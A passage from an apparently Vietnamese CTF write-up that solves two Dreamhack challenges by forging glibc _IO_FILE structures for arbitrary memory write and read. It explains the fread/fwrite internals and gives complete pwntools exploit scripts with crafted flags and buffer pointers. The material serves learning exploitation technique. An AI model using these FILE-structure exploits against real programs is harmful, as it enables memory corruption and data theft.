  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};

```

- vậy đơn giản là ta sẽ setup IO_buf_base là địa chỉ cần ghi và IO_buf_end là địa chỉ+offset , buf_end - buf base phải lớn hơn kích thước được truyền làm tham số cho ```fread``` , vậy ta setup cho nó là 1024 , cuối cùng là thay đổi flags thích hợp và ```fileno``` phải là 0 (stdin) , flags là 0xfbad2488 (_IO_MAGIC(0xfbad0000) + _IO_IS_FILEBUF(0x2000) + _IO_TIED_PU_GET(0x400) + _IO_LINKED(0x80) + _IO_NO_WRITES(0x8))


- đặt break point tại ```fread``` và đi sâu vào hàm này , ta thấy nó gọi ```_IO_file_read``` với các tham số như ta đã nói ở trên

![here](/kuveee.github.io/assets/images/write.png)

- lúc này  khi mình thử nhập 1 dữ liệu rác thì nó đã ghi vào ```overwrite_me``` -> vậy giờ ta sẽ nhập dữ liệu thõa mãn đề để lấy flag

![here](/kuveee.github.io/assets/images/got.png)

exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aaw_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

p = process()
#p = remote('host1.dreamhack.games', 12938)

overwrite_me = 0x00000000006014A0

def way1(target):
    payload = p64(0xfbad2488)
    payload += p64(0) # _IO_read_ptr
    payload += p64(0) # _IO_read_end
    payload += p64(0) # _IO_read_base
    payload += p64(0) # _IO_write_base
    payload += p64(0) # _IO_write_ptr
    payload += p64(0) # _IO_write_end
    payload += p64(target)
    payload += p64(target+1024)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0) # stdin
    return payload
def way2(target):
    fileStr = FileStructure(null=overwrite_me+500)
    fileStr.flags = 0xfbad2488
    fileStr._IO_buf_base = target
    fileStr._IO_buf_end = target + 1024
    fileStr.fileno = 0
    return bytes(fileStr)[:120]


payload = way2(overwrite_me)
input()
payload2 = p64(0xDEADBEEF)
payload2 = payload2.ljust(1024,b'a')
p.sendafter(b'Data: ',payload)

input()
p.sendline(payload2)


p.interactive()
```

- flag : 

![here](/kuveee.github.io/assets/images/flagzz.png)


## _IO_FILE Arbitrary Address Read

- sau baì write tùy ý thì ta sẽ có bài read tùy ý =)))

- 1 bài cũng ngắn tương tự bài trước , mở 1 file -> read vào ```fp``` và dùng ```fwrite``` để ghi chuỗi "test file" vào file

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  read_flag();
  fp = fopen("/tmp/testfile", "w");
  printf("Data: ");
  read(0, fp, 0x12CuLL);
  fwrite("TEST FILE!", 1uLL, 0x400uLL, fp);
  fclose(fp);
  return 0;
}
```

- ở đây ta cũng có 1 hàm read_flag 

```c
int read_flag()
{
  FILE *stream; // [rsp+8h] [rbp-8h]

  stream = fopen("/home/iofile_aar/flag", "r");
  fread(&flag_buf, 1uLL, 0x400uLL, stream);
  return fclose(stream);
}
```

### tóm tắt kĩ thuật

- tương tự bài trước :

Các hàm để ghi dữ liệu vào file điển hình là fwrite và fputs. Các hàm này sẽ gọi hàm _IO_sputn bên trong thư viện.


```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  ...
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
```

- hàm này là 1  marco và thực hiện chức năng của ```_IO_new_file_xsputn```  và nó sẽ gọi ```_IO_OVERFLOW``` tức là hàm ``` _IO_new_file_overflow.```


```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
  {
    f->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
  ...
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
             f->_IO_write_ptr - f->_IO_write_base);
}
int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

- quá trình ghi nội dung vào file bắt đầu từ hàm này và diễn ra thông qua nhiều hàm khác

```c
if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
  {
    f->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
...
if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
         f->_IO_write_ptr - f->_IO_write_base);
```

- hàm này check _flags nó được cấp quyền ghi không , và check ```ch==EOF``` cuối cùng là gọi ```_IO_do_write```


```c
// code in _IO_XSPUTN()
if (_IO_OVERFLOW (f, EOF) == EOF)
```

- và ta cũng thấy nó được truyền tham số EOF vào nên ```io_do_write``` sẽ được gọi và các tham số của nó là các thành viên của ```io_file_struct```

```c
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
    return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
               && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
               ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

- tiếp theo nó gọi ```new_do_write``` bên trong

```c
if (fp->_flags & _IO_IS_APPENDING)
```
- nó sẽ check flags trước khi ghi vào file 

```cs
count = _IO_SYSWRITE (fp, data, to_do);
```

- Tiếp theo, đối số fp và data của hàm new_do_write, cũng như to_do, được gọi là đối số cho hàm _IO_SYSWRITE, đây là hàm _IO_new_file_write trong bảng phương thức (vtable).

```c
_IO_ssize_t
_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
{
  _IO_ssize_t to_do = n;
  while (to_do > 0)
    {
      _IO_ssize_t count = (__builtin_expect (f->_flags2
               & _IO_FLAGS2_NOTCANCEL, 0)
         ? write_not_cancel (f->_fileno, data, to_do)
         : write (f->_fileno, data, to_do));
      if (count < 0)
  {
    f->_flags |= _IO_ERR_SEEN;
    break;
  }
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f->_offset >= 0)
    f->_offset += n;
  return n;
}
```

- trong hàm này , dữ liệu được ghi bằng cách gọi syscall write . các tham số bao gồm ```_file_no  , data từ io_write_base và biến todo là kết quả của phép trừ _IO_write_base khỏi _IO_write_ptr.```

- tóm lại ta sẽ cần setup 3 thằng này 

```cs
write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);
```

- nếu hoạt động bình thường , nó sẽ thực hiện việc ghi với kích thước ```_IO_write_ptr - _IO_write_base bắt đầu từ _IO_write_base```  , tức là _fileno -> stdout  và lưu địa chỉ cần đọc vào ```_IO_write_base``` , sau đó tăng thêm kích thước đọc cho ```_IO_write_ptr``` sẽ cho phép đọc từ 1 giá trị tùy ý

### EXPLOIT

- mục tiêu rõ ràng là ghi đè ```fd``` và setup 3 đối số để đọc dữ liệu chứa flag

```cs
write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);
```

- flag sẽ là ``` _IO_MAGIC và _IO_IS_APPENDING``` để bypass xác thực flag

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aar_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

#p = process()
p = remote('host1.dreamhack.games', 24481)

flag_buf = 0x00000000006010A0

def way1(flag_buf):
    payload = p64(0xfbad0000 | 0x800)  #flags
    payload += p64(0) #read_ptr
    payload += p64(flag_buf) # read_end
    payload += p64(0)  #read_base
    payload += p64(flag_buf)  # write base
    payload += p64(flag_buf + 0x300) # write_ptr
    payload += p64(0) # write_end
    payload += p64(0) # buf_base
    payload += p64(0) # buf end
    payload += p64(0)*5
    payload += p64(1) # stdout
    return payload



def way2(flag_buf):
    fp =  FileStructure()
    fp.flags = 0xfbad0000 | 0x800
    fp._IO_read_end = flag_buf
    fp._IO_write_base = flag_buf
    fp._IO_write_ptr = flag_buf + 0x300
    fp.fileno = 1
    return bytes(fp)[:120]

payload = way2(flag_buf)

p.sendlineafter(b'Data: ',payload)


p.interactive()
```

![here](/kuveee.github.io/assets/images/flagkaka.png)